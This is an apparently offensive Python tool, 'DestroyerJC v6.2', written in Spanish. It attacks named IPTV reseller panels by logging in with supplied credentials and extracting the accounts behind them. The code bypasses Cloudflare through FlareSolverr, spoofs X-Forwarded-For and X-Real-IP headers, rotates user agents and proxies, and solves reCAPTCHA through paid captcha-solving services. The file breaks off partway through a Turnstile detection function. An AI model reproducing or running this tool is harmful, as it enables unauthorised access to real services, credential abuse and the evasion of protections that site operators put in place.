#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DestroyerJC v6.2 - Panel Destroyer con Extractor Integrado
Developed by JC

CHANGELOG v6.2:
- ✅ Integración completa de FlareSolverr para bypass de Cloudflare
- ✅ Nueva clase FlareSolverrHandler para comunicación con FlareSolverr
- ✅ Soporte para GET y POST a través de FlareSolverr
- ✅ Detección automática de Cloudflare (códigos 403, 503, etc.)
- ✅ Validación de servidor con FlareSolverr incluida
- ✅ CloudflareDetector mejorado con soporte FlareSolverr
- ✅ AccountExtractor con inicialización automática de FlareSolverr
- ✅ Login con bypass automático de Cloudflare en GET y POST

REQUISITOS ADICIONALES v6.2:
- FlareSolverr corriendo en Docker: http://localhost:8191
  Comando: docker run -d -p 8191:8191 ghcr.io/flaresolverr/flaresolverr:latest
"""
import requests
import json
import hashlib
import re
import threading
import queue
from queue import Queue
import concurrent.futures
from multiprocessing import Value
from concurrent.futures import ThreadPoolExecutor
import progressbar
from datetime import datetime
import logging
import os
import sys
import io

if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
from urllib.parse import urlparse, quote
import time
import colorama
from colorama import Fore, Style, Back, init
from fake_useragent import UserAgent
from requests.adapters import HTTPAdapter
import configparser
import urllib3
import warnings
from urllib3.util.retry import Retry
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from tabulate import tabulate
import getpass

warnings.filterwarnings('ignore', category=InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests.exceptions import ProxyError, ConnectTimeout, ConnectionError, ReadTimeout
from urllib3.exceptions import ProxyError as Urllib3ProxyError

requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"

init(autoreset=True)

TWOCAPTCHA_API_KEY = ""  #COLOCA TU API DE 2CAPTCHA ENTRE LAS COMILLAS
CAPTCHAAI_API_KEY = "" #COLOCA TU API DE CAPTCHAAI ENTRE LAS COMILLAS
FLARESOLVERR_URL = "http://localhost:8191/v1"

#ESTA LISTA DE ABAJO PUEDES ACTUALIZARLA CON LOS SERVERS QUE TIENEN PROTECCIÓN DE CLOUDFLARE
CLOUDFLARE_PROTECTED_SERVERS = [
    'resellers.tecnomolly.com',
    'tecnomolly.com',
    'gtservicios.xyz',

]

SERVER_SPECIFIC_CONFIG = {
    'resellers.tecnomolly.com': {
        'force_flaresolverr': True,  
        'use_proxies': True,  
        'delay_between_checks': 3,  
        'max_threads': 2,  
        'login_endpoint': '/login.php',  
        'panel_type': 'XC',  
        'description': 'Panel reseller protegido por Cloudflare + IP blocking'
    },
    'tecnomolly.com': {
        'force_flaresolverr': True,
        'use_proxies': True,  
        'delay_between_checks': 3,
        'max_threads': 2,
        'login_endpoint': '/login',  
        'panel_type': '1-stream',  
        'description': 'Panel protegido por Cloudflare + IP blocking'
    },
    'home-playtv.com': {
        'force_flaresolverr': False,
        'use_proxies': True,
        'delay_between_checks': 2,
        'max_threads': 5,
        'login_endpoint': '/reseller/login',  
        'panel_type': 'XC',
        'description': 'Panel XC con ruta de login personalizada'
    },
    'gtservicios.xyz': {
        'force_flaresolverr': True,  
        'use_proxies': False,  
        'delay_between_checks': 3,  
        'max_threads': 2,  
        'login_endpoint': '/login.php',
        'panel_type': 'XC',
        'captcha_timeout': 120,  
        'request_timeout': 120,  
        'description': 'Panel XC protegido por Cloudflare + reCAPTCHA v2 (requiere FlareSolverr + Captchaai)'
    }
}

def is_cloudflare_protected(url):
    """Verifica si una URL está en la lista de servidores protegidos por Cloudflare"""
    from urllib.parse import urlparse
    domain = urlparse(url).netloc

    for protected_domain in CLOUDFLARE_PROTECTED_SERVERS:
        if protected_domain in domain:
            return True
    return False

def get_server_config(url):
    """Obtiene la configuración específica para un servidor"""
    from urllib.parse import urlparse
    domain = urlparse(url).netloc

    for config_domain, config in SERVER_SPECIFIC_CONFIG.items():
        if config_domain in domain:
            return config

    return {
        'force_flaresolverr': False,
        'use_proxies': False,  
        'delay_between_checks': 0,
        'max_threads': 10,
        'description': 'Servidor normal sin protección especial'
    }  

import random
import requests
from urllib.parse import urlparse
from fake_useragent import UserAgent
import logging

class FlareSolverrHandler:
    """Maneja la comunicación con FlareSolverr para resolver protecciones de Cloudflare"""

    def __init__(self, flaresolverr_url=FLARESOLVERR_URL, max_timeout=90000, verbose=True, proxy_url=None):
        self.flaresolverr_url = flaresolverr_url
        self.max_timeout = max_timeout
        self.verbose = verbose
        self.proxy_url = proxy_url  
        self.session_id = None  
        self.available = self._check_availability()

        if self.proxy_url and self.verbose:
            logging.info(f"🌐 Proxy configurado para FlareSolverr: {self.proxy_url[:50]}...")

    def _check_availability(self):
        """Verifica si FlareSolverr está disponible"""
        try:
            payload = {"cmd": "sessions.list"}
            response = requests.post(self.flaresolverr_url, json=payload, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'ok':
                    if self.verbose:
                        logging.info(f"✅ FlareSolverr disponible (v{data.get('version', 'unknown')})")
                    return True
            return False
        except Exception as e:
            if self.verbose:
                logging.warning(f"⚠️ FlareSolverr no disponible: {str(e)}")
            return False

    def create_session(self, session_name=None):
        """Crea una sesión persistente en FlareSolverr (para paneles SPA)"""
        if not self.available:
            return False

        try:
            import time
            self.session_id = session_name or f"session_{int(time.time())}"

            payload = {
                "cmd": "sessions.create",
                "session": self.session_id
            }

            response = requests.post(self.flaresolverr_url, json=payload, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'ok':
                    if self.verbose:
                        logging.info(f"✅ Sesión FlareSolverr creada: {self.session_id}")
                    return True

            self.session_id = None
            return False
        except Exception as e:
            if self.verbose:
                logging.error(f"❌ Error creando sesión: {str(e)}")
            self.session_id = None
            return False

    def destroy_session(self):
        """Destruye la sesión persistente de FlareSolverr"""
        if not self.session_id:
            return True

        try:
            payload = {
                "cmd": "sessions.destroy",
                "session": self.session_id
            }

            response = requests.post(self.flaresolverr_url, json=payload, timeout=30)
            if self.verbose:
                logging.info(f"🗑️ Sesión FlareSolverr destruida: {self.session_id}")

            self.session_id = None
            return True
        except Exception as e:
            if self.verbose:
                logging.warning(f"⚠️ Error destruyendo sesión: {str(e)}")
            self.session_id = None
            return False

    def solve_cloudflare(self, url):
        """Resuelve Cloudflare usando FlareSolverr y retorna cookies + user-agent"""
        if not self.available:
            logging.warning("❌ FlareSolverr no está disponible")
            return None

        try:
            if self.verbose:
                logging.info(f"🔧 Resolviendo Cloudflare con FlareSolverr: {url}")

            payload = {
                "cmd": "request.get",
                "url": url,
                "maxTimeout": self.max_timeout
            }

            if self.session_id:
                payload["session"] = self.session_id
                if self.verbose:
                    logging.info(f"🔗 Usando sesión persistente: {self.session_id}")

            if self.proxy_url:
                payload["proxy"] = {"url": self.proxy_url}
                if self.verbose:
                    logging.info(f"🌐 Usando proxy: {self.proxy_url[:50]}...")

            start_time = time.time()
            response = requests.post(
                self.flaresolverr_url,
                json=payload,
                timeout=self.max_timeout/1000 + 10
            )
            elapsed = time.time() - start_time

            if response.status_code == 200:
                data = response.json()

                if data.get('status') == 'ok':
                    solution = data.get('solution', {})
                    cookies = solution.get('cookies', [])
                    user_agent = solution.get('userAgent', '')
                    html = solution.get('response', '')
                    status_code = solution.get('status')

                    if self.verbose:
                        logging.info(f"✅ Cloudflare resuelto en {elapsed:.1f}s - Status: {status_code} - Cookies: {len(cookies)}")

                    cookies_dict = {}
                    for cookie in cookies:
                        cookies_dict[cookie['name']] = cookie['value']

                    return {
                        'success': True,
                        'cookies': cookies,  
                        'cookies_dict': cookies_dict,  
                        'user_agent': user_agent,
                        'html': html,
                        'status_code': status_code
                    }
                else:
                    error_msg = data.get('message', 'Unknown error')
                    logging.error(f"❌ Error en FlareSolverr: {error_msg}")
                    return None
            else:
                logging.error(f"❌ FlareSolverr respondió con código: {response.status_code}")
                try:
                    error_data = response.json()
                    error_msg = error_data.get('message', 'No message')
                    logging.error(f"❌ Mensaje de error: {error_msg}")
                except:
                    logging.error(f"❌ Respuesta: {response.text[:200]}")
                return None

        except requests.exceptions.Timeout:
            logging.error(f"❌ Timeout resolviendo Cloudflare con FlareSolverr")
            return None
        except Exception as e:
            logging.error(f"❌ Error con FlareSolverr: {str(e)}")
            return None

    def solve_cloudflare_post(self, url, post_data):
        """Resuelve Cloudflare usando FlareSolverr con POST y retorna cookies + respuesta"""
        if not self.available:
            logging.warning("❌ FlareSolverr no está disponible")
            return None

        try:
            if self.verbose:
                logging.info(f"🔧 Enviando POST con FlareSolverr: {url}")

            payload = {
                "cmd": "request.post",
                "url": url,
                "postData": "&".join([f"{k}={v}" for k, v in post_data.items()]),
                "maxTimeout": self.max_timeout
            }

            if self.session_id:
                payload["session"] = self.session_id

            if self.proxy_url:
                payload["proxy"] = {"url": self.proxy_url}

            start_time = time.time()
            response = requests.post(
                self.flaresolverr_url,
                json=payload,
                timeout=self.max_timeout/1000 + 10
            )
            elapsed = time.time() - start_time

            if response.status_code == 200:
                data = response.json()

                if data.get('status') == 'ok':
                    solution = data.get('solution', {})
                    cookies = solution.get('cookies', [])
                    user_agent = solution.get('userAgent', '')
                    html = solution.get('response', '')
                    status_code = solution.get('status')
                    final_url = solution.get('url', url)

                    if self.verbose:
                        logging.info(f"✅ POST con FlareSolverr completado en {elapsed:.1f}s - Status: {status_code}")

                    cookies_dict = {}
                    for cookie in cookies:
                        cookies_dict[cookie['name']] = cookie['value']

                    return {
                        'success': True,
                        'cookies': cookies,
                        'cookies_dict': cookies_dict,
                        'user_agent': user_agent,
                        'html': html,
                        'status_code': status_code,
                        'url': final_url
                    }
                else:
                    error_msg = data.get('message', 'Unknown error')
                    logging.error(f"❌ Error en FlareSolverr POST: {error_msg}")
                    return None
            else:
                logging.error(f"❌ FlareSolverr POST respondió con código: {response.status_code}")
                return None

        except requests.exceptions.Timeout:
            logging.error(f"❌ Timeout en POST con FlareSolverr")
            return None
        except Exception as e:
            logging.error(f"❌ Error en POST con FlareSolverr: {str(e)}")
            return None

    def apply_solution_to_session(self, session, solution):
        """Aplica la solución de FlareSolverr a una sesión de requests"""
        if not solution or not solution.get('success'):
            return False

        try:

            for cookie in solution['cookies']:
                session.cookies.set(
                    cookie['name'],
                    cookie['value'],
                    domain=cookie.get('domain', ''),
                    path=cookie.get('path', '/')
                )

            if solution.get('user_agent'):
                session.headers.update({'User-Agent': solution['user_agent']})

            if self.verbose:
                logging.info(f"✅ Solución FlareSolverr aplicada a la sesión")
            return True

        except Exception as e:
            logging.error(f"❌ Error aplicando solución FlareSolverr: {str(e)}")
            return False

class CloudflareDetector:
    """Detecta y maneja sitios protegidos por Cloudflare - VERSIÓN MEJORADA CON FLARESOLVERR"""

    def __init__(self, flaresolverr_handler=None):
        self.cloudflare_domains = set()
        self.detection_cache = {}
        self.ua_generator = None
        self.flaresolverr = flaresolverr_handler  

        try:
            self.ua_generator = UserAgent()
        except Exception:
            self.ua_generator = None

        self.bypass_strategies = {
            'basic': self._get_basic_headers,
            'mobile': self._get_mobile_headers,
            'stealth': self._get_stealth_headers,
            'aggressive': self._get_aggressive_headers
        }

    def detect_and_get_headers(self, url, max_attempts=4):
        """Detecta Cloudflare y obtiene headers apropiados"""
        try:
            domain = self._extract_domain(url)

            if domain in self.detection_cache:
                is_cf = self.detection_cache[domain]
            else:
                is_cf = self.is_cloudflare_protected(url)
                self.detection_cache[domain] = is_cf

            if not is_cf:
                return self.get_standard_headers(url), 'standard'

            for attempt in range(1, max_attempts + 1):
                strategy = list(self.bypass_strategies.keys())[attempt - 1] if attempt <= len(self.bypass_strategies) else 'aggressive'
                headers = self.get_bypass_headers(url, attempt, strategy)

                if self._test_headers(url, headers):
                    return headers, f'cloudflare_{strategy}'

            return self.get_standard_headers(url), 'fallback'

        except Exception as e:
            logging.warning(f"Error en detección Cloudflare: {str(e)}")
            return self.get_standard_headers(url), 'error'

    def is_cloudflare_protected(self, url_or_domain):
        """Detecta si un sitio usa Cloudflare - MEJORADO"""
        domain = self._extract_domain(url_or_domain)

        if domain in self.detection_cache:
            return self.detection_cache[domain]

        try:
            test_url = f"http://{domain}" if not url_or_domain.startswith('http') else url_or_domain

            response = requests.get(
                test_url,
                headers=self.get_standard_headers(test_url),
                timeout=8,
                verify=False,
                allow_redirects=True
            )

            is_cf = self._detect_cloudflare_in_response(response)
            self.detection_cache[domain] = is_cf

            if is_cf:
                self.cloudflare_domains.add(domain)
                logging.info(f"🛡️ Cloudflare detectado en {domain}")
            else:
                logging.info(f"✅ Sin Cloudflare en {domain}")

            return is_cf

        except Exception as e:
            logging.debug(f"Error detectando Cloudflare en {domain}: {e}")
            return False

    def _detect_cloudflare_in_response(self, response):
        """Detecta Cloudflare en la respuesta - MEJORADO"""
        if not response:
            return False

        cf_headers = [
            'cf-ray', 'cf-cache-status', 'cf-request-id', 
            'cf-connecting-ip', 'cf-visitor', 'cf-ipcountry',
            'cf-worker', 'cf-edge-cache'
        ]

        has_cf_headers = any(header.lower() in [h.lower() for h in response.headers.keys()] 
                           for header in cf_headers)

        server_header = response.headers.get('server', '').lower()
        is_cf_server = any(cf_indicator in server_header for cf_indicator in ['cloudflare', 'cf-nginx'])

        cf_content_patterns = [
            'checking your browser', 'ddos protection by cloudflare',
            'ray id:', 'cloudflare', 'cf-browser-verification',
            'challenge-platform', 'please wait while we are checking',
            'just a moment', 'enable javascript and cookies',
            'cf-error-details', 'attention required'
        ]

        has_cf_content = False
        if hasattr(response, 'text'):
            response_text = response.text.lower()
            has_cf_content = any(pattern in response_text for pattern in cf_content_patterns)

        is_protection_code = response.status_code in [403, 503, 429, 521, 522, 523, 524, 525, 526]

        return has_cf_headers or is_cf_server or has_cf_content or (is_protection_code and (has_cf_headers or is_cf_server))

    def get_bypass_headers(self, url, attempt=1, strategy='basic'):
        """Obtiene headers para bypass según estrategia"""
        domain = self._extract_domain(url)

        if strategy in self.bypass_strategies:
            return self.bypass_strategies[strategy](domain, attempt)
        else:
            return self._get_basic_headers(domain, attempt)

    def _get_basic_headers(self, domain, attempt):
        """Headers básicos para bypass"""
        return {
            "Host": domain,
            "User-Agent": self._get_random_ua('chrome'),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }

    def _get_mobile_headers(self, domain, attempt):
        """Headers móviles para bypass"""
        return {
            "Host": domain,
            "User-Agent": self._get_random_ua('mobile'),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1"
        }

    def _get_stealth_headers(self, domain, attempt):
        """Headers stealth avanzados"""
        return {
            "Host": domain,
            "User-Agent": self._get_random_ua('safari'),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Safari";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"macOS"',
            "DNT": "1",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        }

    def _get_aggressive_headers(self, domain, attempt):
        """Headers agresivos para casos difíciles"""
        return {
            "Host": domain,
            "User-Agent": self._get_random_ua('firefox'),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": f"en-US,en;q=0.{random.randint(5,9)}",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "TE": "trailers",
            "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Real-IP": f"{random.randint(1,223)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache"
        }

    def get_standard_headers(self, url):
        """Headers estándar para sitios sin Cloudflare"""
        parsed = urlparse(url)
        domain = parsed.netloc

        return {
            "Host": domain,
            "User-Agent": self._get_random_ua('chrome'),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

    def _get_random_ua(self, browser_type='chrome'):
        """Obtiene User-Agent aleatorio con fallback"""
        if self.ua_generator:
            try:
                if browser_type == 'mobile':
                    return self.ua_generator.safari  
                elif browser_type == 'firefox':
                    return self.ua_generator.firefox
                elif browser_type == 'safari':
                    return self.ua_generator.safari
                elif browser_type == 'chrome':
                    return self.ua_generator.chrome
                else:
                    return self.ua_generator.random
            except Exception:
                pass

        fallback_uas = {
            'chrome': [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ],
            'firefox': [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
            ],
            'safari': [
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
                "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
            ],
            'mobile': [
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/115.0"
            ]
        }

        browser_uas = fallback_uas.get(browser_type, fallback_uas['chrome'])
        return random.choice(browser_uas)

    def _extract_domain(self, url_or_domain):
        """Extrae el dominio de una URL"""
        if url_or_domain.startswith('http'):
            return urlparse(url_or_domain).netloc.split(':')[0]
        return url_or_domain.split(':')[0]

    def _test_headers(self, url, headers, timeout=5):
        """Test rápido de headers"""
        try:
            response = requests.head(url, headers=headers, timeout=timeout, verify=False)
            return response.status_code not in [403, 503, 429, 521, 522, 523, 524]
        except Exception:
            return False

    def solve_with_flaresolverr(self, url):
        """Intenta resolver Cloudflare usando FlareSolverr si está disponible"""
        if not self.flaresolverr or not self.flaresolverr.available:
            logging.debug("FlareSolverr no está disponible")
            return None

        try:
            logging.info(f"🔧 Intentando resolver con FlareSolverr: {url}")
            solution = self.flaresolverr.solve_cloudflare(url)

            if solution and solution.get('success'):
                logging.info(f"✅ Cloudflare resuelto con FlareSolverr")
                return solution
            else:
                logging.warning(f"❌ FlareSolverr no pudo resolver Cloudflare")
                return None

        except Exception as e:
            logging.error(f"❌ Error usando FlareSolverr: {str(e)}")
            return None

class AccountExtractor:
    def __init__(self, url, username, password, verify_accounts=True, thread_id=None, proxy_manager=None, verbose=True, proxy_url=None):
        self.url = self.validate_and_fix_url_static(url)
        self.original_url = self.url  
        self.username = username
        self.password = password
        self.thread_id = thread_id or threading.current_thread().ident
        self.proxy_manager = proxy_manager
        self.current_proxy = None
        self.verbose = verbose
        self.proxy_url = proxy_url  

        self.lock = threading.Lock()
        self.is_slow_server = 'alfatv.lat' in self.url or ':4179' in self.url
        self.cookies = {}
        self.host_m3u = ""
        self.panel_type = None
        self.total_filtered_accounts = 0
        self.admin = "NO"

        self.server_config = get_server_config(self.url)
        self.is_cloudflare_protected = is_cloudflare_protected(self.url)

        if self.is_cloudflare_protected:
            self.log(f"🛡️ Servidor detectado con protección Cloudflare", Fore.YELLOW)
            self.log(f"📋 Configuración: {self.server_config['description']}", Fore.CYAN)
            if self.server_config['force_flaresolverr']:
                self.log(f"⚡ FlareSolverr será usado obligatoriamente", Fore.CYAN)
            if not self.server_config['use_proxies']:
                self.log(f"🚫 Proxies deshabilitados para este servidor", Fore.YELLOW)

        parsed = urlparse(self.url)
        self.proto = parsed.scheme
        self.host = parsed.netloc
        self.base_url = f"{self.proto}://{self.host}"
        path_parts = parsed.path.strip('/').split('/')
        self.base_path = path_parts[0] if path_parts else ''

        self.reseller_info = {
            'url': self.url,
            'username': username,
            'password': password,
            'credits': 'N/A',
            'active_accounts': 'N/A',
            'account_limit': 'N/A',
            'status': 'N/A',
            'expiry_date': 'N/A'
        }

        self.captchaai_solver = None
        self.solver = None

        try:
            import captchaai
            self.captchaai_solver = captchaai.CaptchaAI(CAPTCHAAI_API_KEY)
            self.log("✅ Captchaai inicializado", Fore.GREEN)
        except ImportError:
            self.log("⚠️ Captchaai no disponible, instalando...", Fore.YELLOW)
            try:
                import subprocess
                subprocess.check_call([sys.executable, "-m", "pip", "install", "captchaai"])
                import captchaai
                self.captchaai_solver = captchaai.CaptchaAI(CAPTCHAAI_API_KEY)
                self.log("✅ Captchaai instalado e inicializado", Fore.GREEN)
            except Exception as e:
                self.log(f"⚠️ No se pudo instalar Captchaai: {str(e)}", Fore.YELLOW)
        except Exception as e:
            self.log(f"⚠️ Error inicializando Captchaai: {str(e)}", Fore.YELLOW)

        try:
            from twocaptcha import TwoCaptcha
            self.solver = TwoCaptcha(TWOCAPTCHA_API_KEY)
            self.log("✅ 2captcha inicializado como fallback", Fore.GREEN)
        except ImportError:
            self.log("⚠️ TwoCaptcha no disponible", Fore.YELLOW)

        flaresolverr_timeout = self.server_config.get('request_timeout', 90) * 1000  
        self.flaresolverr_handler = FlareSolverrHandler(
            verbose=self.verbose,
            proxy_url=self.proxy_url,
            max_timeout=flaresolverr_timeout
        )
        if self.flaresolverr_handler.available:
            self.log("✅ FlareSolverr inicializado y disponible", Fore.GREEN)
            if self.server_config.get('request_timeout'):
                self.log(f"⏱️ Timeout de FlareSolverr: {flaresolverr_timeout/1000}s", Fore.CYAN)
        else:
            self.log("⚠️ FlareSolverr no disponible - usando métodos tradicionales", Fore.YELLOW)

        self.cloudflare_detector = CloudflareDetector(flaresolverr_handler=self.flaresolverr_handler)
        self.flaresolverr_solution = None
        self.flaresolverr_user_agent = None  

        self.ua = UserAgent()
        self.session = requests.Session()

        if self.is_slow_server:
            retry_strategy = Retry(
                total=2,
                backoff_factor=3,
                status_forcelist=[429, 500, 502, 503, 504, 408, 520, 521, 522, 523, 524],
                allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
            )
            self.default_timeout = (20, 60)
        else:
            retry_strategy = Retry(
                total=3,
                backoff_factor=2,
                status_forcelist=[429, 500, 502, 503, 504, 408],
                allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
            )
            self.default_timeout = (10, 30)

        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=5 if self.is_slow_server else 10,
            pool_maxsize=10 if self.is_slow_server else 20,
            pool_block=False
        )

        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self.session.verify = False

        self.session.headers.update({
            'Connection': 'keep-alive',
            'Keep-Alive': 'timeout=60, max=50' if self.is_slow_server else 'timeout=30, max=100'
        })

    def log(self, message, color=Fore.CYAN):
        """Log thread-safe con identificador de hilo"""
        if not self.verbose:
            return
        thread_prefix = f"[T-{str(self.thread_id)[-4:]}]"
        with self.lock:
            print(color + f"{thread_prefix} {message}" + Style.RESET_ALL)

    def detect_recaptcha(self, html_content):
        """Detecta si hay un reCAPTCHA en la página - VERSIÓN MEJORADA"""
        captcha_patterns = [
            r'data-sitekey="([^"]+)"',
            r'sitekey\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
            r'grecaptcha\.render\([^,]+,\s*{\s*[\'"]?sitekey[\'"]?\s*:\s*[\'"]([^\'"]+)[\'"]',
            r'www\.google\.com/recaptcha/api\.js.*?render=([^&"\']+)',
        ]

        for pattern in captcha_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                sitekey = match.group(1)
                self.log(f"🔍 reCAPTCHA detectado con sitekey: {sitekey}", Fore.YELLOW)
                return sitekey

        if 'www.google.com/recaptcha' in html_content or 'grecaptcha' in html_content:
            self.log("🔍 reCAPTCHA detectado pero no se pudo extraer sitekey", Fore.YELLOW)
            return True

        return None

    def solve_recaptcha(self, sitekey, page_url):
        """Resuelve el reCAPTCHA usando Captchaai primero, luego 2captcha como fallback"""

        if self.captchaai_solver:
            try:

                print(f"{Fore.CYAN}🤖 Resolviendo reCAPTCHA con Captchaai...{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}⏳ Esto puede tomar 30-60 segundos...{Style.RESET_ALL}")
                self.log("🤖 Resolviendo reCAPTCHA con Captchaai...", Fore.CYAN)
                self.log("⏳ Esto puede tomar 30-60 segundos...", Fore.YELLOW)

                result = self.captchaai_solver.recaptcha(
                    sitekey=sitekey,
                    url=page_url,
                    version='v2'
                )

                if result and 'code' in result:
                    print(f"{Fore.GREEN}✅ reCAPTCHA resuelto exitosamente con Captchaai{Style.RESET_ALL}")
                    self.log("✅ reCAPTCHA resuelto exitosamente con Captchaai", Fore.GREEN)
                    return result['code']
                else:
                    print(f"{Fore.RED}❌ Error resolviendo reCAPTCHA con Captchaai: {result}{Style.RESET_ALL}")
                    self.log(f"❌ Error resolviendo reCAPTCHA con Captchaai: {result}", Fore.RED)

            except Exception as e:
                print(f"{Fore.RED}❌ Error con Captchaai: {str(e)}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}🔄 Intentando con 2captcha como fallback...{Style.RESET_ALL}")
                self.log(f"❌ Error con Captchaai: {str(e)}", Fore.RED)
                self.log("🔄 Intentando con 2captcha como fallback...", Fore.YELLOW)

        if not self.solver:
            print(f"{Fore.RED}❌ Ningún servicio de captcha está disponible{Style.RESET_ALL}")
            self.log("❌ Ningún servicio de captcha está disponible", Fore.RED)
            return None

        try:
            print(f"{Fore.CYAN}🤖 Resolviendo reCAPTCHA con 2captcha...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}⏳ Esto puede tomar 30-60 segundos...{Style.RESET_ALL}")
            self.log("🤖 Resolviendo reCAPTCHA con 2captcha...", Fore.CYAN)
            self.log("⏳ Esto puede tomar 30-60 segundos...", Fore.YELLOW)

            result = self.solver.recaptcha(
                sitekey=sitekey,
                url=page_url
            )

            if result and 'code' in result:
                print(f"{Fore.GREEN}✅ reCAPTCHA resuelto exitosamente con 2captcha{Style.RESET_ALL}")
                self.log("✅ reCAPTCHA resuelto exitosamente con 2captcha", Fore.GREEN)
                return result['code']
            else:
                print(f"{Fore.RED}❌ Error resolviendo reCAPTCHA con 2captcha: {result}{Style.RESET_ALL}")
                self.log(f"❌ Error resolviendo reCAPTCHA con 2captcha: {result}", Fore.RED)
                return None

        except Exception as e:
            print(f"{Fore.RED}❌ Error con 2captcha: {str(e)}{Style.RESET_ALL}")
            self.log(f"❌ Error con 2captcha: {str(e)}", Fore.RED)
            return None

    def detect_turnstile(self, html_content):
        """Detecta si hay Cloudflare Turnstile en la página"""
        turnstile_patterns = [
            r'data-sitekey="([^"]+)".*?turnstile',
            r'turnstile.*?data-sitekey="([^"]+)"',
            r'challenges\.cloudflare\.com/turnstile.*?sitekey[\'"]?\s*[:=]\s*[\'"]([^\'"]+)',
